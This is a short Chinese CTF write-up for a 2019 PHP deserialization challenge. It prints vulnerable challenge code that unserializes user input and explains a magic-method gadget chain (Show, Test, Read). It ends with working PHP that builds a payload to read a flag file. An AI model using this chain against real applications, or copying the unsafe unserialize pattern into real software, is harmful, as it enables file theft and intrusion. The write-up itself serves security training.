---
title: 2019京津冀大学生安全挑战赛 php反序列化小题
date: 2019-09-20 00:00:00
categories:
- CTF/Web
tags: php反序列化 
---

## 题目

非常非常简单一道小题，手快抢了一血

```php
<?php
error_reporting(1);
class Read {
    private $var;
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
    
    public function __invoke(){
        $content = $this->file_get($this->var);
        echo $content;
    }
}


class Show
{
    public $source;
    public $str;
    public function __construct($file='index.php')
    {
        $this->source = $file;
        echo $this->source.'解析开始'."<br>";
    }
   
    public function __toString()
    {
        $this->str['str']->source;
    }

    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|fllllllaaaaaag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
        
    }

    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}

class Test
{
    public $params;
    public function __construct()
    {
        $this->params = array();
    }

    public function __get($key)
    {
        $func = $this->params;
        return $func();
    }  
}

unserialize($_GET['a']);
?>
```

## 解法

根据Show类中过滤的内容猜测flag在fllllllaaaaaag.php中，访问了一下果然有，所有读到这个文件的源码即可。

首先，Show类和Read类可以读文件，Show有过滤先看Read：

- file_get函数可以读文件
- __invoke函数中调用了file_get函数
- __invoke魔术方法会在当这个对象被当做函数调用的时候会执行

然后看Test类：

- Test类的__get方法会去把一个变量当做函数去调用
- __get方法会在访问类中一个不存在的成员时被调用

最后看Show类：

- __toString方法中回去访问一个source成员
- __toString方法会在对象被当做字符串的时候被调用
- __wakeup方法中会检查对象中source的恶意字符
- __wakeup方法会在对象反序列后调用

所以解法很明显了：

- 直接给Read类的私有成员var赋值为"fllllllaaaaaag.php"
- new一个Read类对象a
- new一个Test类对象b，让b的params成员为a
- new一个Show类对象c，让c的str成员时一个Array，其中有一个键为'str'的对应值是b
- new一个Show类对象d，让d的source是c
- 序列化对象d即为payload

```php
<?php
class Read {
    private $var="fllllllaaaaaag.php";
}

class Show
{
    public $source;
    public $str;
}

class Test
{
    public $params;
}

$a = new Read;
$b = new Test;
$b->params=$a;
$c = new Show;
$c->str=array('str'=>$b);
$d = new Show;
$d->source=$c;
$payload = serialize($d);
echo base64_encode($payload)
?>
```